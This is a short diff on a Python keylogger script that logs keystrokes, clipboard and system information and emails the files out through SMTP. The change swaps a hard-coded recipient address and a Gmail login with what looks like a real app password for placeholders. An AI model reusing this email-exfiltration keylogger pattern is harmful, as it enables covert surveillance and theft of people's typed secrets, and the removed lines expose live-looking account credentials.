@@ -16,7 +16,7 @@ from requests import get
 log = 'log.txt'
 path ='E:\\Python Keylogger\\Test'
 extend='\\'
-toaddr = "aadiinsta12@gmail.com"
+toaddr = "xxxxxx@gmail.com"
 keys_information = "log.txt"
 sysinfo='Sysinfo.txt'
 clipboard='clipboard.txt'
@@ -78,7 +78,7 @@ def send_email(filename, attachment, toaddr):
     smtplib.UseDefaultCredentials = False;
     smtplib.EnableSsl = True;
 
-    s.login('testmailk1ng1@gmail.com', 'exqdvhnrxgjlrkas')
+    s.login('zzzzzzzz@gmail.com', 'pwdpwdpwdpwdpwd')
 
     text = msg.as_string()
 
